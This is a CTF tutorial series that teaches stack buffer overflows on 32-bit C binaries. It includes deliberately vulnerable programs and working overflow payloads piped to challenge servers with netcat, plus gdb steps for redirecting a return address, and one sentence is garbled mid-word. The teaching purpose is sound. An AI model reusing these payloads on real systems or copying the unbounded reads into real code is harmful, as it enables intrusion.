# Brewing of Pwntions

Hi there, wizards and witches! Pwntions sounds interesting, eh? Please, enter
my class of introduction to pwntions. I will teach you how to brew pwntions 
to use against vulnerable magical systems, and creatures applying these
systems. In muggle language, brewing such pwntions are called writing __exploits__. 
[This site](https://searchsecurity.techtarget.com/definition/exploit) has nice 
explanation of exploit: "A computer exploit, or exploit, is an attack on a computer 
system, especially one 
that takes advantage of a particular vulnerability the system offers to intruders. 
Used as a verb, exploit refers to the act of successfully making such an attack."
Writing such exploits is the goal of this course, to successfully take advantage of 
vulnerabilities in C programs. 

Note that for this tutorial, we assume that you have basic knowledge of Python scripting 
and a little knowledge on how to apply the `pwntools` library. This is described in the 
[Python tutorial](https://tghack.no/page/Python%20tutorial). We use the knowledge 
from the Python tutorial to build exploit scripts. Think of exploit scripts as a recipe for 
baking a cake. However, this is a magical recipe,  so that you do not bake that cake 
manually. You just write the cake's recipe, and then you wave your wand and the cake 
bakes itself. In other words, instead of exploiting the program manually, 
you tell the script all the steps to exploit the program and then run the script. 

All of the exploit scripts we are going to write in this course are exploiting vulnerabilities 
in C programs in order to change values in the memory (we explain the memory later on,
it sounds a lot scarier than it really is). That way, we manipulate the program
to do something else than it is supposed to. In our case, we want to manipulate the
program to show us the flag. Whenever you get a flag, it means that you have 
successfully changed the memory of the program. The programs are certainly not supposed 
to print the flags, but you made it do it! Think of it like finding secret information from the 
computer hosting the program. 

_"As there is little foolish wand-waving here, many of you will hardly believe this is magic. I don't expect you will really understand the beauty of the softly simmering cauldron with its shimmering fumes, the delicate power of liquids that creep through the human veins, bewitching the minds, ensnaring the senses... I can teach you how to bottle fame, brew glory, and even stopper death - if you aren't as big a bunch of dunderheads as I usually have to teach."_

—Professor maritio_o's introduction of the subject

## Agenda for the class 
In this course, the art of stack overflows is on the agenda.
Stack overflow is an ancient way of making pwntions, and neither wizards or 
muggles have gotten affected by this pwntion in many decades.

<br>

**Class plan:**

| Class topic | Description |
|:-----------:|:-----------:|
| Introduction to the stack | In order to understand stack overflows, you are introduced to the stack and how it is built when running programs | 
| Stack overflow lecture 1 | Overflows for values next to each other on the stack |
| Stack overflow lecture 2 | Overflowing into structs |
| Stack overflow lecture 3 | Overflowing return addresses |

<br>

## Important note for running 32-bit binary files
There is one important and essential thing to note when running 32-bit binary
files on your Linux distribution. Most Linux distributions nowadays do not come
with support for running 32-bit binaries. We use 32-bit binaries in this
tutorial because they are easier to exploit than 64-bit binaries. To enable
support for running 32-bit binaries on your system you need a few libraries.
You can install these libraries by following the steps in
[this answer](https://askubuntu.com/a/454254) for the question
"How to run 32-bit app in Ubuntu 64-bit?".

When you have installed the libraries to run 32-bit binaries, you may run the binary given 
to you in the task by entering `./binary_name` in the terminal. Make sure that you are in 
the same folder in the terminal as the binary file. If you get a message about not having 
the right permission, execute the following command and try again: `chmod +x binary_name`. 

Another thing to keep in mind: We have compiled the binaries in a special way, so you 
will not be able to get a vulnerable binary if you compile the source code yourself with a 
common Makefile code. The source code we give you is solely for you to read and 
understand what is going on, not to compile.

<br>

## Exams giving magical XP points
There are three exams related to this class. At the end of each class, you will 
be presented with a new exam that you might be ready to take. All of the exams 
may be found in the pwn category in the tasks page. Here is a list of the 
exams:

| Exam name | Points |
|:---------:|:------:|
| Pwntions 1 | 50 |
| Pwntions 2 | 75 |
| Pwntions 3 | 100 |

Good luck with the class, and please give us [feedback](https://goo.gl/forms/We7BdVGaB5953S032) so we can improve our class!

<br>
# Brewing of Pwntions: Stack overflow introduction

Hi class! Welcome to the first lecture of Introduction to Pwntions. We will 
start the course by explaining the memory and the stack of runnable programs.
Every program needs a place to store values in order to be able to do their job.
The place the values are stored is called the __memory__. In this tutorial, we
focus on the __stack__, which is a specific part of the memory. Values from 
programs are stored on the stack. Through this course, you will learn about a 
specific vulnerability called __stack overflow__, and learn different ways
of manipulating C programs' by changing the values on the stack with the stack 
overflow vulnerability.

Stack overflows are common in programs where the programmer has to manage memory
manually. Such programming languages are often called low level languages, 
because they 
are closer to the hardware of the machine it is running on. The C programming 
language is a very good example of that, and is very common in the pwn category 
in hacking competitions. Other programming languages such as Java, C#, and 
Javascript are high level programming languages where the system manages 
everything that has to do with the memory and stack. For instance, let's say the 
programmer wants to read text from a file. In Java or C# she does not need to 
specify the amount of space required to read the file into a variable. Using the 
C programming language, she will have to specifically set an amount of space 
that the variable will be allowed to use. Setting this space is called 
**allocating** space, and the function **malloc** is one of the ways to 
allocate space. I will show you an example in one of the coming classes. In 
other words, she must specifically handle files with more text than the 
variable has room for when using C, while Java and C# will handle that for the 
programmer. This is just a fun fact to make it clear why we always use C in 
pwn, and nothing important to pass the exams later on.


<details><summary>High level and low level programming example</summary><p>

In each of the exams for this class, you are presented with a C program. The 
programs reads a file, and outputs it as the banner of the task. 
Let's take a look at how this is done in Python, and then in C. Both programs
simply reads a file called `banner.txt`, and prints its content to the
terminal. Here's the Python script:

```python
1	banner_file = open("banner.txt","r")
2	
3	banner = banner_file.read()
4	
5	print(banner)
6	
7	banner_file.close()
```

In this Python snippet, we do four simple things.

* Line 1: Open the file
* Line 3: Read the content of the file
* Line 5: Print the banner
* Line 7: Close the file

We do not have to worry about how big the banner file is, or how much space the
program needs to run it. 

The C program in the snippet below does the same four things, but also
has a few additional interesting lines worth discussing. This program has 
to specify the amount of space needed to read the file. Let's start by taking
a look at the lines that does the same as in the python script:

* Line 10: Open the file
* Line 22: Read the content of the file
* Line 27: Close the file
* Line 29: Print the banner

Now, we pick the lines that are important when discussing low level 
programming compared to high level programming. Let's skip everything else 
than the lines 17, 18, and 31, as those are the only important ones:

* Line 17: Set the `size` variable to the size of the file's content.
* Line 18: This is the special part for low level programs!! A function 
called `calloc()` is called. _Calloc_ allocates space for a variable.
* Line 31: Free the space allocated for the `buf` variable. If we forget 
to free allocated space, the machine may run out of memory.

The definition of memory allocation is as follows: 

```
Memory allocation is a process by which computer programs and services are 
assigned with physical or virtual memory space. Memory allocation is the 
process of reserving a partial or complete portion of computer memory for the 
execution of programs and processes.
```

Simply put, we must make space for a certain amount of data. In our case, we 
specify that the variable `buf` should have as much space as the integer 
variable `size` holds. 

```C
 1	#include <stdlib.h>
 2	#include <stdio.h>
 3	
 4	static void print_banner(void)
 5	{
 6		FILE *fp;
 7		char *buf;
 8		size_t size;
 9	
10		fp = fopen("banner.txt", "r");
11		if (!fp) {
12			perror("fopen(banner.txt)");
13			exit(EXIT_FAILURE);
14		}
15	
16		fseek(fp, 0, SEEK_END);
17		size = ftell(fp);
18		buf = calloc(1, size);
19		rewind(fp);
20	
21		/* -1 to drop newline */
22		if (fread(buf, size - 1, 1, fp) < 1) {
23			perror("fread()");
24			exit(EXIT_FAILURE);
25		}
26	
27		fclose(fp);
28	
29		printf("%s\n", buf);
30	
31		free(buf);
32	}
33	
34	int main(void)
35	{
36		print_banner();
37	
38		return 0;
39	}
```

Note that whenever this code is in a task, you may ignore it. It is simply put
there to print a nice banner, not to find vulnerabilities in.

</p></details>

<br>

_______

All of the exams are quite simple if one understands the stack and memory 
layout. However, understanding the stack and memory layout itself isn't that 
simple. They control pieces of information that the program needs to 
do its job. For instance if a program neeAs long as you know the purpose of the return address, you
understand ds to make a variable that is used
throughout the program, then it needs to be stored somewhere in memory on the machine. 
That somewhere is usually on the stack. A memory layout describes how the memory
is built for a specific program. The stack is one of many parts of the memory 
layout. For this class, we focus on the stack and everything else is irrelevant.

Note that understanding the stack is very important in order to write exploit scripts.
Writing scripts that exploits vulnerabilities in C programs is the main goal of this
tutorial. We want to write our exploit scripts so that we manipulate the programs
to do something else than it is supposed to. In our case, we want to manipulate the
program to show us the flag which is placed on a remote machine.

Let's start by drawing an example of the memory layout of a C program, but only
include the stack:

![Memory Layout](https://storage.googleapis.com/tghack-public/stackframe_main_pwn101.png)

The illustration above shows us two stack frames. A stack frame is the memory layout 
for a function. Functions are ways to put the code into chunks, making the code
reusable, clean, and readable. Let's take a look at a C program and point out 
the three functions:

```C
#include <stdio.h>

static void do_random_stuff()
{
	printf("Doing random stuff\n");  
}

static void print_a_line()
{
	printf("Printing a line\n");
}

int main() 
{
	printf("Starting program here!\n");
  
	/* Calling functions from the main function*/
	do_random_stuff();
	print_a_line();
	do_random_stuff();

	return 0;
}
```

Did you see the functions? They are as following, `main()`, `do_random_stuff()`
, and `print_a_line()`. The main function is the entry point of every C program.
It means that whenever youa read a C program, this is where to start reading.
Then we see that the main function calls the other two functions before exiting
the program with `return 0;`.

Now that we know what a function is, let's continue learning about the stack 
frame. The drawing on the left shows the prologue of the stack frame. It sets 
up the stack and registers that the function will use. In other words, 
the prologue prepares the function before it is used. In these preparations,
the __return address (ret)__ and the __saved base pointer (ebp)__ are pushed 
onto the stack from the previous stack frame, and space is allocated for the local 
variables of the function.

The return address is at the top of both stack frames in the illustration. It 
is an address to the previous stack frame so that the current function knows 
where to return after finishing running through its code. __Btw, the return address is really important!__ Understanding the purpose of the return address might
be the most important part of stack overflows. So just keep in mind that:

```
The return address is the address the program returns to after running
the code of a function. That means that if you replace the existing 
return address with another memory address, the program will run 
whatever code is placed on that memory address. If that address does 
not exist, you will get an error called a Segmentation Fault. 
```

With this info, we know that we may trigger a Segmentation Fault error 
to find the exact place of the existing memory address. This way, we know
where to put new memory address. But how do we know which memory
address to replace the existing with? The three following classes will 
demonstrate it! Well, that was a little (but important!) digression, so let's
move on the describing the rest of the above illustration.

The base pointer is pushed on the stack after the return address. It is on the 
stack in order to know how to find the local variables. It is not super 
important to understand what the return address and the saved base pointer 
really are for the exams, but it is really important that you know where the 
return address is placed on the stack frame!

Lastly, the stack frame makes space for all the local variables in the function.

Let's take a look at the C program for this illustration:

```C
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>

struct user {
	char name[16];
	int age;
	bool is_hacker;
} __attribute__((packed)); /* the attribute makes sure that there is no padding between struct members */

int main() 
{
	struct user hacker;
	hacker.is_hacker = 0;
	hacker.age = 25;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("Hey, hacker! What's your name?\n");

	read(STDIN_FILENO, hacker.name, 30);

	if (hacker.age == 25 && hacker.is_hacker == 1) {
		printf("You made it! Hackers dont have an age limit!\n");
		system("/bin/sh");
	} else {
		printf("Oh noes, you're not old enough to be a hacker!\n");
	}

 	return 0;
}
```

The illustration is of the above program's main function. The only local 
variable in _main_ is the struct, which is the first declared variable in the function, 
`struct user hacker`. You will later learn about what a struct is,
but for now, think of this struct as a variable that can contain members.
Members are variables inside of the struct.

The memory layout drawing to the right shows the stack frame of the main 
function when all the variables have been initialized with a value. We can see 
that the variables are ordered in the same way as it is defined in the 
struct, which is something that always happens with values in structs. 

Alright, quite heavy start for this class.. With a little training, you will 
understand that it is not as hard as it might seem. Please stop by my office
at the TG:Hack area in the Creative lounge if it is hard to understand!
Remember that you can always search on _Google_ for new technical words you haven't heard
about before, in order to learn more about the topic. The TG:Hack crew always use
_Google_ when we are uncertain about something!

See you in the next class. We will learn about manipulating the stack to show 
us a secret value that no one is ever supposed to see!

# Brewing of Pwntions: Stack overflow lecture 1

Hi class! Welcome to the second lecture of Introduction to Pwntions. This is
the first lecture with practical content.
I have brought a house elf to this class. His name is Pwnie. He has a rare
condition making him vulnerable to an ancient type of pwntions - namely 
**stack overflows**. To get a detailed introduction to stack overflows, take
a look at the previous lecture.

In the introductional lecture we said that the return address is very important.
You will not have to worry about the return address in this lecture. Now, we
focus on overwriting the _null byte_ of a variable. That way we  make the 
program think the next variable is a part of the first variable. If we print the 
first variable, then the program will think the next variable is a part of the first
and print that as well. Let's try it out! 

So, our house elf Pwnie. Poor guy. We will make pwntions in this and
the following classes, and test them on him. But don't feel bad, he will not 
feel any pain.

---

<br>

First, it is very useful to look at the source code:

```C
#include <stdio.h>
#include <unistd.h>

int main(void)
{
	/* Declare variables */
	char secret_message[] = "TG19{This_is_a_dummy_flag}";
	char magical_buffer[64];

	/* Send output to terminal */
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("Give me some magical spell!\n");

	/* Fetch input */
	read(STDIN_FILENO, magical_buffer, 128);

	/* Print name to terminal */
	printf("%s\n", magical_buffer);

	return 0;
}
```

Do you remember the stack frame examples from the introduction class? Let us 
take a look at a similar illustration for the above source code:
  
![Memory Layout](https://storage.googleapis.com/tghack-public/pwntion1_stackframe.png)

We want to brew the pwntion so that Pwnie tells us his secret message. The 
secret message is placed underneath the saved base pointer in the illustration,
named as `secret_message`. In order to make this pwntion right, we have to 
overwrite the null value of the variable that is placed on the stack before the 
secret message. Think about that for a second.. The variable before the secret
message..

Which value on the stack is located before the secret message, and which is
located after? What comes first? It depends on the system really, but our systems 
store the return address at the high memory, while the local variables are 
stored in the low memory. When reading the stack, we go from low to high. 
However, every value put on the stack is inserted from high to low memory.
For instance, in the code above, we declared the variable `secret_message` first,
and then the variable `magical_buffer`. Therefore, `secret_message` is at the 
high memory, above `magical_buffer`. If it is still unclear, take a look at 
the example with five variables below. 

<details><summary>Example with five variables</summary><p>
	
	Let's say we have five variables in the code instead, getting a source
	code like the snippet below:
	
```c
#include <stdio.h>
#include <unistd.h>

int main(void)
{
	/* Declare variables */
	char secret_message[] = "TG19{This_is_a_dummy_flag}";
	int message_length;
	char magical_buffer[64];
	int wizard_level = 1337;
	int is_dark_magic = 0;

	/* Send output to terminal */
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("Give me some magical spell!\n");

	/* Fetch input */
	read(STDIN_FILENO, magical_buffer, 128);

	/* Print name to terminal */
	printf("%s\n", magical_buffer);

	return 0;
}
```

	As mentioned in the stack overflow introduction, the return address 
	and the saved base pointer are put on the stack in the function 
	prologue, so they are on the stack before declaring all the 
	variables in the function. The code always starts at the main() 
	function, and then we read from top to bottom. Firstly, the 
	`secret_message` is put on the stack, at high memory underneath 
	the return value and the saved base pointer. The next variable, 
	`message_length`, is put underneath the `secret_message`. Then 
	`magical_buffer` is put underneath, followed by `wizard_level`, 
	and lastly, `is_dark_magic`. This is illustrated in the picture 
	below.

![Memory Layout for variables example](https://storage.googleapis.com/tghack-public/pwntion1_stackframe_variables.png)
</p></details>

<br>

Although the variables are put into the stack from high to low memory, all 
the input we insert fills up the variables from low to high memory within
that variable. Therefore, our buffers are overflowed towards high memory. 
Let's take a look at this in the illustrations below.

To begin with, we start filling up the `magical_buffer` buffer in the local 
variables. Our buffer has room for 64 bytes. Each character use 1
byte of space. So let's write a message of 48 characters/bytes. Then the buffer 
has room for 16 more bytes before it is full. Everything looks fine in our
illustration, where the pink color is the 48 bytes of input:

![Memory Layout 48 bytes input](https://storage.googleapis.com/tghack-public/pwntion1_stackframe_48b_input.png)

Let us insert another 32 bytes, which equals 80 bytes of input into the buffer.
As we had room for 64 bytes, we have an excessive 16 bytes. These excessive 16
bytes writes over 16 bytes worth of values after the buffer. In the illustration
below, we see that the `magical_buffer` is full, and the 16 first bytes of the 
`secret_message` is replaced with our input.

![Memory Layout 80 bytes input](https://storage.googleapis.com/tghack-public/pwntion1_stackframe_80b_input.png)

---

<br>

Now, we've looked at overwriting values on the stack by inserting more data than
the buffer has room for. The next step is to build the insert string. The string will 
overwrite the values exactly how we want the stack to look like. This will manipulate
the program to act the way we would like it to.

Let's build an input string together! In this class' topic, we have a special
mission. A vulnerability allowing us to leak the secret message, is writing our
input so close to the secret message that the program will think the secret 
message is a part of our magical spell buffer. Next time the buffer is 
printed to our terminal, the secret message will appear as well.

Why is that professor maritio\_o, you may ask? Well, the reason is that all 
C strings are terminated by a _null_-value. A null value looks like this: _0x0_.
If the null value is not present, the program will think the next bytes are part 
of the variable as well.

We know a few things by looking at the source code:
* the buffer has room for 64 bytes by looking at the `magical_buffer` buffer in 
the source code. (64 byte buffer = 63 bytes input + null byte).
* the program allows for reading 128 bytes from the user input.
* we want to write input that exactly overwrites the buffer and its null 
value.

<details><summary>Tip for input</summary><p>

	It is common in pwntions to build a string using lots of A's. The A's are used
	for padding. Padding just means the values that are insignificant of value. In 
	other words, it doesn't really matter what input we send. We use A's because 
	the hex value of A is `0x41`. That means that when debugging the program, we 
	know where our padding is placed, because we may look for tons of `0x41`'s.
</p></details>

<br>

With that information we can build an input string like this

```bash
"A" * 64
```

... and insert it to our local program to test it:

```bash
$ python -c 'print "A" * 64' | ./pwn_intro1
```

If it works locally on your machine, you should be ready for the exam! The exam 
use something called _netcat_ (nc). A hot tip is to replace the binary file
you test with locally on your machine with the url and port that netcat use
to connect to the server. Then your input will be sent to the server. 

<details><summary>netcat example</summary><p>

netcat to remote server without input, just to test task:

```bash
$ nc url.tghack.no 1337
```

Here, 1337 is the port number specified in the task description. 
The example below shows how to connect to the remote server and send 
input at the same time.

```bash
$ python -c 'print "A" * 64' | nc url.tghack.no 1337
```
</p></details>

<br>

Go on, build the magical spell to overwrite the null value of the magical spell
buffer, and fetch the flag! It is the first task of the exam in the pwn
category on the challenges page. Good luck!

# Brewing of Pwntions: Stack overflow lecture 2

Hello wizards and witches! Welcome to the second lecture of Introduction to Pwntions. 
Our house elf Pwnie's side effects from last lecture have worn off, and he is
ready for another round of pwntions! This time we will look at another type of
_stack overflow_. Remember that more detailed information about stack overflows 
may be found in the introductional lecture.

Today, we will learn how to change the values of the variables on the stack. 
That means, we still won't deal with the return address. However, by learning how to 
change the values on the stack,  you've basically learned how to change the 
return address as well! For now, let's focus on how we can change the values of  
the C program's variables by overwriting the values on the stack. Go go! Learn 
something awesome!

---

<br>

Let's get straight to the point! As mentioned, it is very useful to look at 
the source code:

```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

struct magical_spell {
    char name[32];
    int age;
    int is_awesome;
};

int main() 
{
    /* Declaring variables */
    struct magical_spell pwntion_spell;
    memset(&pwntion_spell, 0, sizeof(pwntion_spell));
    pwntion_spell.age = 1337000000;
    pwntion_spell.is_awesome = 0;
    
    /* Printing text to terminal */
    printf("Professor maritio_o:\n");
    printf("Tell me a pwntion spell name!\n");
    printf("Pwntion spell name:\n");
    printf("> ");

    /* Read 64 bytes of user input from terminal, 
	 * and put into pwntion.spell_name */
	read(STDIN_FILENO, pwntion_spell.name, 64);
    
    /* Printing text to terminal*/
    printf("%s\n", pwntion_spell.name);
    
    /* if statement*/
    if (pwntion_spell.age == 1337000000 && pwntion_spell.is_awesome == 1) {
        printf("Amazing! You did it, awesome student at school of wizardry!\n");
        system("cat flag.txt");
    } else {
        printf("Hmm, look's like Pwnie isn't telling you a word...\n");
    }

    return 0;
}
```

It is also super nice to draw an illustration of the stack frame for the source
code. Let's do that again: 
  
![Memory Layout](https://storage.googleapis.com/tghack-public/pwntion2_stackframe.png)

As in the previous lecture, we want to brew the pwntion so that Pwnie tells us 
his secret message. But this time the message is hidden another place. The 
secret message is hidden on the server in a file called _flag.txt_. The only
way to get the magical flag is to brew a pwntion that overwrites the _struct_ in 
the code so that the _if statement_ returns the content of the flag.txt file. 

Another strange magical word... _struct_... It's important to understand these 
crazy magical words for the pwntions to work. A struct allows us to combine 
several data items of different kinds into one structure under a specific name. 
This structure may be used several times in the C code, by using the name to make 
instances of the struct. These variables are in the same block of memory. For
instance, we may make a struct called **student**. Each student has a name, an
age and a wizardry school house, as illustrated in the snippet below. Read more 
about structs [here](https://www.tutorialspoint.com/cprogramming/c_structures.htm).

<details>
  <summary>struct example</summary><p>
	
```C
struct student {
			char name[64];
			int age;
			char house_name[100];
};
```
</p></details>

<br>

And what the magical beans is an _if statement_?!? If you read our Python tutorial
you should already know that this is. An if statement is used to
check a condition, and make an act depending on whether the condition is true or 
false. For instance, the snippet below checks if a **student** is part of the 
house Hufflepuff, and then print "Yaay!" if the student is part of Hufflepuff, 
or "Booo!" if the student is not. Read more about if statements 
[here](https://intellipaat.com/tutorial/c-tutorial/c-if-statement/).

<details>
  <summary>if statement example</summary><p>
  As you remember from the Python tutorial we can use if-statements to do comparisons and print out strings if something is true.
	
```python
if student.house_name == "Hufflepuff":
    print "Yaay!"
else:
    print "Booo!"
```

However, in C we cannot use the `==` operator to compare strings, we have to use a function called [strcmp](https://linux.die.net/man/3/strcmp) to CoMPare STRings.
To make matters confusing the `strcmp`-function returns `0` if the strings are equal, so we have to do the following:

```C
if(strcmp(student.house_name, "Hufflepuff") == 0) {
  printf("Yaay!\n");
} else {
  printf("Booo!\n");
}
```
</p></details>

<br>

Lastly, I want to mention what happens when the program runs `system("cat flag.txt");`.
In C programming, **system()** is a very easy and convenient way of running 
shell commands. Beware, it is _not_ a smart way, it is just easy. `cat flag.txt`
is a command that will paste the content of the file called `flag.txt`.

<details>
  <summary>Tip for running binaries that need files to run properly, locally on your machine</summary><p>
	
If you get an error saying `No such file or directory` like the snippet below, 
it means that the binary is missing a file on your system to run properly.

```bash
Professor maritio_o:
Tell me a pwntion spell name!
Pwntion spell name:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
1337000000
1
Amazing! You did it, awesome student at school of wizardry!
cat: flag.txt: No such file or directory
```

In the snippet, we see the error says `cat: flag.txt: No such file or directory`. 
That means that the program tries to run the `cat` command with `flag.txt` as a
parameter, which pastes the content of the flag.txt file into the terminal. The
solution is to make a file called _flag.txt_ on your computer, into the folder
that you run the binary from. It is nice to put in a dummy flag, so that you 
know it works as wanted.
</p></details><br>


<details>
  <summary>Read about another common system() command, /bin/sh</summary><p>

I want to mention what happens when a program runs `system("/bin/sh");`.
This system command is often used in pwn instead of pasting the flag into the 
terminal, so you would see it in the code instead of `system("cat flag.txt");`. 
In pwning, this particular piece of code is very well known. We call it **spawning a 
shell**. When a shell is spawned, you may interact with the system just like if
you where using your normal Linux terminal. This means that if you have the right
permissions, you may be able to read the files on the system. In pwn and CTFs,
you will often see that you find a task's flag in a file called `flag.txt`.
</p></details>

<br>

---

<br>

In the last lecture, we looked at overflowing values on the stack by inserting 
more data than the input buffer has room for. We will do the same in this lecture, 
but this time we have to overwrite the values in the struct and write the exact 
value we need to make the program print the flag. Therefore, we need to build the 
insert string to as following:

1. Find the amount of padding we need until the struct values start.
2. Set the `is_awesome` variable within the struct to be _True_.
3. Make sure that we do _NOT_ overwrite the age of the spell, because then the 
code will not accept the spell.

How to solve these steps:

1. We find the amount of padding by looking at the local variable that we 
insert the input into. By looking at the code, we see that it has room for 32 bytes
(31 bytes for your input and the last byte for the null byte that tells the program
it is the end of the variable). In other words, we need at least 32 bytes of padding.

2. In the code, we see that the `is_awesome` variable contains the value _0_. 
In programming, 0's and 1's are often used to represent True and False 
values. In this case we want to change from 0 to 1. However, it is not straight forward 
to send a number as input to the program. Because of this being a 32 bit program,
and the variable being an integer, we have to write the `1` as a 4 byte little endian 
integer. It must also be represented as a hexadecimal value, as that is how it is stored 
on the stack. That results in this input: `\x01\x00\x00\x00`.

<details><summary>Writing integers in 32 bit programs represented as hexadecimal values</summary><p>

Overwriting the `is_awesome` variable isn't as straight-forward as 
simply sending 32 A's followed by a 1 like this:

```python
r.sendline("A"*32 + str(1))
```
We have to overwrite the number using a 4-byte little-endian representation of the
number. The value must be 4 bytes, since `int`s are 4-byte in size. Little-endian 
refers to the way values are laid out in system memory. For 32-bit x86, values are 
stored starting with the *least significant byte* first! See [this article on endianness](https://en.wikipedia.org/wiki/Endianness#Little) for more information.

When overwriting data like this, it's common to represent data using hex strings, 
like this:

```python
a = "\x41\x41\x41\x41" # the string AAAA
b = "\xef\xbe\xad\xde"  # the value 0xdeadbeef
```
Note that we start with `\xef`, not `\xde`, since the values are stored in little-endian 
format.
Thus, to represent the value `1` as a 4-byte little-endian value we write it like this: 
`\x01\x00\x00\x00`.

This operation is very common when doing exploit development, so pwntools has some nice 
helper functions for making things easier. These are called `p16`, `p32`, and `p64`, and turns numbers into 16, 
32, and 64 bit little-endian byte values, respectively. The p stands for `packed`.

```python
r.sendline("A"*32 + p32(1))
```
</p></details>

<br>

3. As we must _NOT_ overwrite the age of the spell, it must remain _1.337.000.000_
years old, and we must insert the hexadecimal value of that into the stack as well.
By Googling or using Python, we find out that the hex value is _0x4fb10040_.
As for the `is_awesome` variable, it is important to write the age in hexadecimal 
and little endian with 4 bytes, in order for the program to read it as a valid number,
so we end up with the following value: `\x40\x00\xb1\x4f`.
 

<details>
  <summary>Fetching hexadecimal values in terminal using Python</summary><p>
	
```bash
$ python
>>> hex(1337000000)
'0x4fb10040'
```
</p></details>

<br>

With that information we can build an input string like this, 

```bash
"A" * 32 + "\x40\x00\xb1\x4f" + "\x01\x00\x00\x00"
```

... and insert it to our local program to test it:

```bash
$ python -c 'print "A" * 32 + "\x40\x00\xb1\x4f" + "\x01\x00\x00\x00"' | ./pwn_intro2 
```

If it works locally on your machine, you should be ready for the exam! A hot tip
for the exam is to replace the binary file on your machine with the _netcat_ (nc)
url and port. Then you insert the input to the server. Poke us on Discord or 
come by the TG:Hack area in the Creative zone for help!

<details>
  <summary>netcat example</summary><p>

```bash
$ python -c 'print "A" * 32 + "\x40\x00\xb1\x4f" + "\x01\x00\x00\x00"' | nc url.here.tghack.no 1337
```
</p></details>

<br>

Go on, build the magical spell to overwrite the struct with the right value in
your magical spell buffer, and fetch the flag! It is the second task of the exam. 
Good luck!

# Brewing of Pwntions: Stack overflow lecture 3

Wizards and witches.... It is time for the third and last lecture about stack 
overflows. Pwnie is always happy to help teach engaged students, but I guess
he is happy that this is the last lecture for him drinking stack overflow
pwntions! Remember that more detailed information about stack overflow and the 
stack and heap may be found in the second introductional lecture.

For this lecture, we will start doing the magic with the return address. I will show
you the info about the return address again:

```
The return address is the address the program returns to after running
the code of a function. That means that if you replace the existing 
return address with another memory address, the program will run 
whatever code is placed on that memory address. If that address does 
not exist, you will get an error called a Segmentation Fault. 
```

So, what we will do today is basically to change the existing return address to 
another memory address. Let's find out how to do that, and which memory
address we want there instead of the existing one!

---

<br>

We are getting used to pwntions now, and we all know it is time to take a look
at some C programming language source code. It is not always provided in pwn 
tasks, but all exams in this pwntions class include source code, and a
binary file. Let's take a look at the following source code:

```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void print_secret_message(void)
{
	system("cat flag.txt");
}

void answer_professor(void)
{
	char spell_name[20];

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("Professor maritio_o:\n");
	printf("Does anyone remember the name of the spell we made last lecture?\n");

	read(STDIN_FILENO, spell_name, 64);
}

int main(void)
{
	answer_professor();

	return 0;
}
```

By now you might have noticed, drawing a picture of the stack frame is very 
useful. Maybe you now understand enough about the memory layout and may draw 
them yourself in the future!
  
![Memory Layout](https://storage.googleapis.com/tghack-public/pwntion3_stackframe.png)

As in the previous lectures, we want to brew the pwntion so that Pwnie tells us 
his secret message. The secret message is hidden on the server in a file called 
_flag.txt_. This is equal to the previous lecture. However, my great students,
there is one main difference. The part of the source code that prints the flag
is inside a _function_. And did you notice something special in the code? The 
function is never called! It just lies there. An excessive, but powerful, part 
of the program, waiting for someone to do some magic to exploit the fact that 
someone even left it there. It should have been removed before publicly 
published.

These pwntions. They contain lots of strange magical words. Do you remember 
what a _function_ is? We talked about it in the introductional lecture about 
stack overflows. Take a look at the second introductional lecture to read 
more about functions. 

---

<br>

In the last lecture, we looked at overflowing values in a struct to change them
into values we wanted it to contain. We manipulated the program to do something 
else than it was supposed to. We will do a lot of the same in this lecture. 
We overwrite some variables on the stack with values we want to replace
them with, manipulating the program to run the function that prints the flag.
To manipulate the program in such a way, we need to talk about _return 
addresses_. Do you remember what a return address is? Take a look in the 
introductional lecture about stack overflows, and you will get your answers!
As a little recap, the return address of a function is stored on the stack, so 
that the function knows where to return after finishing executing all of its 
code.

If we replace the four bytes containing the return address with another memory 
address, the program will try to execute whatever lies on that memory address.
For instance, if we replace the return address with the return address of the 
`print_secret_message` function, then the program will proceed to that function 
and execute all of the code inside that function. However, if the memory address 
we overwrite with isn't valid, the program will get an error called a 
_segmentation fault_, also called a _seg fault_. 

This time, we must do some investigation before building the input string. 
There are two steps for this investigation:
1. Find the amount of padding before we reach the return address
2. Find the memory address we want the program to run after finishing running 
the code in the _answer_professor_ function.

Solving these two steps:

1. Have you used _gdb_ before? No? Awesome! Then you will learn some incredible magic
today. To make this easier, download [gdb-peda](https://github.com/longld/peda) 
from Github. 

As mentioned, the program gets a segmentation fault if the return address is
invalid. That also means that if we overwrite the return address with `A`s, it 
will segfault. By testing different amounts of padding, and noticing at which
points the program segfaults and not, we may find the exact padding before the 
placement of the new return address. Let's open gdb in the terminal. Having
gdb-peda installed, you will see output like this:

```bash
$ gdb ./pwn_intro3
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./pwn_intro3...done.
gdb-peda$
```

<details><summary>Nice gdb-peda commands</summary><p>

There are several commands you may use in gdb-peda:

* _r_: runs the binary
	* If wanted, you may run and insert input at the same time using something like 
`` $ r <<< `python -c 'print "A" * 60'` ``.
* _b_: inserts breakpoint, which makes the debugger stop at this memory address if it reaches it. Examples:
	* b \*0x03f8c0b6
	* b main
	* b functionname
	* b *functionname+offset, e.g. b *main+20
* _c_: continue when the debugger stops at breakpoint
* _disas_: disassemble a function. Example:
	* disas main
	* disas functioname

</p></details>

<br>

Now, run the debugger with input, like this:

```bash
gdb-peda$ r <<< `python -c 'print "A" * 20'`
```

The debugger didn't complain, did it? Mine looks like the following snippet, 
so everything went really nice:

```bash
